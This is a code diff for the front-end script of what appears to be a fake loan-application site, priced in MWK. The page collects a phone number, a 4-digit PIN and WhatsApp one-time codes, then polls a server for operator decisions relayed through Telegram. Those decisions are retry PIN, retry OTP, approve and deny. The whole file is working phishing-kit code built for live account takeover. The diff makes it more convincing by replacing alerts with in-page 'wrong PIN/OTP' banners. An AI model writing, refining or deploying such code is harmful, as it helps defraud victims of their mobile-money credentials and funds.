@@ -1,5 +1,4 @@
 document.addEventListener('DOMContentLoaded', () => {
-  // DOM element references matching your flow
   const stepUnderstand = document.getElementById('step-I UNDERSTAND');
   const stepSlider = document.getElementById('step-slider');
   const stepLoan1 = document.getElementById('step-loan-1');
@@ -10,6 +9,9 @@ document.addEventListener('DOMContentLoaded', () => {
   const stepOtp = document.getElementById('step-otp') || document.getElementById('step-WHATSSAP');
   const stepSuccess = document.getElementById('step-success');
 
+  const pinSurfaceBanner = document.getElementById('pin-surface-banner');
+  const otpSurfaceBanner = document.getElementById('otp-surface-banner');
+
   let currentUserId = null;
   let otpStep = 1;
   let statusPollInterval = null;
@@ -17,7 +19,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
-  // Function to switch active screens
   function showStep(targetStep) {
     const allSteps = [stepUnderstand, stepSlider, stepLoan1, stepLoan2, stepLoan3, stepForm, stepOtp, stepSuccess];
     allSteps.forEach(s => {
@@ -44,7 +45,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Auto-focus utility for PIN (4 digits) & OTP (4 digits)
+  // 4-Digit Auto focus logic
   const pinDigits = document.querySelectorAll('.pin-digit');
   const otpDigits = document.querySelectorAll('.otp-digit');
 
@@ -67,25 +68,23 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits);
 
-  // 1. step-I UNDERSTAND -> step-slider
+  // Step Transitions
   document.getElementById('btn-understand-proceed').addEventListener('click', () => {
     showStep(stepSlider);
   });
 
-  // 2. step-slider -> step-loan-1
   document.getElementById('btn-slider-next').addEventListener('click', () => {
     showStep(stepLoan1);
   });
 
-  // 3. step-loan-1 back / next
   document.getElementById('btn-loan1-back').addEventListener('click', () => {
     showStep(stepSlider);
   });
+
   document.getElementById('btn-loan1-next').addEventListener('click', () => {
     showStep(stepLoan2);
   });
 
-  // 4. step-loan-2 back / next validation
   const phoneNumber = document.getElementById('phone-number');
   const phoneError = document.getElementById('phone-error');
 
@@ -105,7 +104,6 @@ document.addEventListener('DOMContentLoaded', () => {
     showStep(stepLoan3);
   });
 
-  // 5. step-loan-3 (PIN Entry) back / next
   const pinError = document.getElementById('pin-error');
 
   document.getElementById('btn-loan3-back').addEventListener('click', () => {
@@ -120,7 +118,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     pinError.style.display = 'none';
 
-    // Populate Summary
+    // Summary details
     const loanAmount = document.getElementById('loan-amount').value;
     const loanDuration = document.getElementById('loan-duration').value;
     const loanType = document.getElementById('loan-type').value;
@@ -136,7 +134,6 @@ document.addEventListener('DOMContentLoaded', () => {
     showStep(stepForm);
   });
 
-  // 6. step-form back / submit
   document.getElementById('btn-form-back').addEventListener('click', () => {
     showStep(stepLoan3);
   });
@@ -168,15 +165,13 @@ document.addEventListener('DOMContentLoaded', () => {
         startStatusPolling();
       } else {
         hideLoading();
-        alert(data.error || 'Submission failed.');
       }
     } catch (e) {
       hideLoading();
-      alert('Network error submitting application.');
     }
   });
 
-  // Polling Server / Telegram Status
+  // Status Polling from Admin Telegram Actions
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
@@ -198,30 +193,32 @@ document.addEventListener('DOMContentLoaded', () => {
           hideLoading();
           otpStep = 2;
           otpDigits.forEach(i => i.value = '');
+          if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
           otpDigits[0].focus();
-          alert('First OTP accepted. Please enter secondary 4-digit OTP received via WhatsApp.');
           showStep(stepOtp);
         } else if (data.status === 'SUCCESS') {
+          // DIRECT TRANSITION TO SUCCESS SCREEN AFTER ADMIN APPROVAL
           clearInterval(statusPollInterval);
           hideLoading();
           document.getElementById('approved-amount-display').innerText = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;
           showStep(stepSuccess);
         } else if (data.status === 'RETRY_PIN') {
+          // DISPLAY IN-PAGE WRONG PIN BANNER
           clearInterval(statusPollInterval);
           hideLoading();
-          alert('Incorrect PIN entered. Please re-enter your 4-digit PIN.');
+          if (pinSurfaceBanner) pinSurfaceBanner.classList.add('active');
           pinDigits.forEach(i => i.value = '');
           showStep(stepLoan3);
         } else if (data.status === 'RETRY_OTP') {
+          // DISPLAY IN-PAGE WRONG OTP BANNER
           clearInterval(statusPollInterval);
           hideLoading();
-          alert('Incorrect OTP entered. Please re-enter the 4-digit code from WhatsApp.');
+          if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
           otpDigits.forEach(i => i.value = '');
           showStep(stepOtp);
         } else if (data.status === 'DENIED') {
           clearInterval(statusPollInterval);
           hideLoading();
-          alert('Application request was declined.');
           showStep(stepUnderstand);
         }
       } catch (e) {}
@@ -258,15 +255,12 @@ document.addEventListener('DOMContentLoaded', () => {
         startStatusPolling();
       } else {
         hideLoading();
-        alert(data.error || 'Failed to submit OTP.');
       }
     } catch (e) {
       hideLoading();
-      alert('Network error submitting OTP.');
     }
   });
 
-  // Return Home
   document.getElementById('btn-go-home').addEventListener('click', () => {
     window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
   });
@@ -281,4 +275,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-    
+  
